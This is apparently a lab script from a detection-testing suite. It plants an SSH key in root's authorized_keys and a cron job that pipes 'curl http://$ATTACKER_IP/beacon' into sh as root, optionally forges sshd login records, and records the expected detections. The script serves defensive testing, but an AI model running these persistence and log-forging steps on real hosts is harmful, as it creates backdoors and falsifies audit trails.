#!/bin/sh
# 07_persistence.sh — MITRE T1098.004 SSH Authorized Keys / T1053.003 Cron
#
# REAL-LIFE STORY
#   Once an attacker is in, the very next thing they do is make sure they can
#   get back in without the original hole. The two cheapest, most durable ways
#   on a Linux box are: drop your own key into root's authorized_keys (now you
#   have passwordless root over SSH, forever, and it survives a password reset),
#   and plant a cron job that beacons to your C2 (now you have periodic code
#   execution that survives a reboot). Neither runs anything visible until it is
#   used — which is exactly why they are the persistence primitives to hunt for.
#
# WHAT IS GENUINE vs SIMULATED
#   - GENUINE: a real key is appended to /root/.ssh/authorized_keys and a real
#     cron fragment is written to /etc/cron.d/lfa_beacon. The files get real,
#     fresh mtimes — and the mtime is the evidence: "when was this planted".
#   - SIMULATED (optional, LFA_WITH_ANCHOR=1): a preceding brute-forced login
#     from the attacker IP, so the correlation finding can fire standalone.
#
# DETECTION LAYER — READ THIS, it is the point of the scenario
#   In ISOLATION this is EVIDENCE ONLY: the authkeys parser emits an
#   `authorized_key` event and the cron parser emits a `suspicious_cron_job`
#   event (the `curl | sh` shape trips its indicators), both carrying the file
#   mtime. There is no rule that scores an SSH key or a cron job on its own —
#   by design, because on a real host most keys and cron jobs are legitimate.
#
#   The FINDING is `persistence_after_login`, and it is a CORRELATION: it fires
#   only when one of these persistence items appears within 120 minutes AFTER a
#   successful login from a source IP that also brute-forced the host (>=5
#   failed logins). That anchor comes from scenario 02 in the chain (chain.sh),
#   or set LFA_WITH_ANCHOR=1 here to inject a minimal burst + login so the
#   finding fires from this one script.
#
# REPRODUCIBLE: YES, fully. Deterministic; safe to re-run (idempotent writes).

set -e
DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
. "$DIR/lib.sh"
require_root "07_persistence"
confirm_lab

# A syntactically valid ed25519 public key. It is not a real usable key (the
# blob is padded lab bytes) but it decodes, so the authkeys parser fingerprints
# it and reports it exactly as it would a live backdoor key.
ATTACKER_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILFA0000000000000000000000000000000000000000000 attacker@c2"

echo "[*] 1/2 Planting an attacker SSH key in /root/.ssh/authorized_keys..."
mkdir -p /root/.ssh
chmod 700 /root/.ssh
# idempotent: only append if this exact key is not already present
if ! grep -qF "$ATTACKER_KEY" /root/.ssh/authorized_keys 2>/dev/null; then
    printf '%s\n' "$ATTACKER_KEY" >> /root/.ssh/authorized_keys
fi
chmod 600 /root/.ssh/authorized_keys
echo "    appended (fingerprint will appear as an authorized_key event)."

echo "[*] 2/2 Planting a cron beacon in /etc/cron.d/lfa_beacon..."
# /etc/cron.d/* is 'system' layout -> carries a user field between schedule and
# command. The 'curl ... | sh' shape trips the cron parser's suspicious
# indicators -> subcategory=suspicious_cron_job (high).
cat > /etc/cron.d/lfa_beacon <<EOF
# LAB MARKER — synthetic C2 beacon planted by 07_persistence.sh
* * * * * root curl -s http://$ATTACKER_IP/beacon | sh
EOF
chmod 644 /etc/cron.d/lfa_beacon
echo "    wrote /etc/cron.d/lfa_beacon (runs every minute as root)."

# ---------------------------------------------------------------------------
# Optional anchor: make persistence_after_login fire from THIS script alone by
# injecting the brute-forced login the correlation needs. In the chain this is
# unnecessary — scenario 02 already provides it — so it is off by default.
# ---------------------------------------------------------------------------
ANCHORED=0
if [ "${LFA_WITH_ANCHOR:-0}" = "1" ]; then
    echo "[*] LFA_WITH_ANCHOR=1: injecting a brute-forced login anchor from $ATTACKER_IP..."
    VICTIM="${LFA_TARGET_USER:-$(getent passwd 1000 | cut -d: -f1)}"
    [ -n "$VICTIM" ] || VICTIM=root
    for u in root admin test support oracle "$VICTIM"; do
        logger -t sshd -p auth.info "Failed password for $u from $ATTACKER_IP port 49152 ssh2"
    done
    logger -t sshd -p auth.info "Accepted password for $VICTIM from $ATTACKER_IP port 49158 ssh2"
    logger -t sshd -p auth.info "pam_unix(sshd:session): session opened for user $VICTIM by (uid=0)"
    ANCHORED=1
    echo "    (persistence_after_login should now fire: key+cron planted just after this login)"
fi

# Ground truth is honest about what was actually injected: the two persistence
# items are always evidence; persistence_after_login is only claimed as a
# scored finding when an anchor is present (here via LFA_WITH_ANCHOR, or in the
# chain via scenario 02). Without an anchor, scoring this case in isolation
# would (correctly) show no finding, so we do not claim one.
THREATS='[
    {"threat_id":"T1098_ssh_key","name":"Attacker SSH key added to root authorized_keys",
     "expected_rule":null,"detection_layer":"evidence",
     "details":"authorized_key event for /root/.ssh/authorized_keys with a fresh file mtime",
     "verify":"SELECT * FROM events WHERE subcategory=\"authorized_key\" AND source_artifact_path LIKE \"%root/.ssh/authorized_keys\""},
    {"threat_id":"T1053_cron_beacon","name":"C2 beacon cron job planted",
     "expected_rule":null,"detection_layer":"evidence",
     "details":"suspicious_cron_job event for /etc/cron.d/lfa_beacon (curl | sh) with a fresh file mtime",
     "verify":"SELECT * FROM events WHERE subcategory=\"suspicious_cron_job\" AND description LIKE \"%lfa_beacon%\""}'
if [ "$ANCHORED" = "1" ]; then
    THREATS="$THREATS,
    {\"threat_id\":\"T1098_persistence_after_login\",\"name\":\"Persistence created shortly after a brute-forced login\",
     \"expected_rule\":\"persistence_after_login\",\"detection_layer\":\"finding\",
     \"details\":\"SSH key + cron planted within 120 min of an accepted login from $ATTACKER_IP, which also brute-forced the host\",
     \"verify\":\"SELECT * FROM findings WHERE rule_name=\\\"persistence_after_login\\\"\"}"
fi
THREATS="$THREATS
  ]"

write_ground_truth "$DIR/07_persistence.ground_truth.json" "persistence" "$THREATS"
echo "[+] Scenario 07 complete. Planted: /root/.ssh/authorized_keys key, /etc/cron.d/lfa_beacon."
[ "$ANCHORED" = "1" ] || echo "    (evidence-only in isolation; run in chain.sh or set LFA_WITH_ANCHOR=1 for the finding.)"
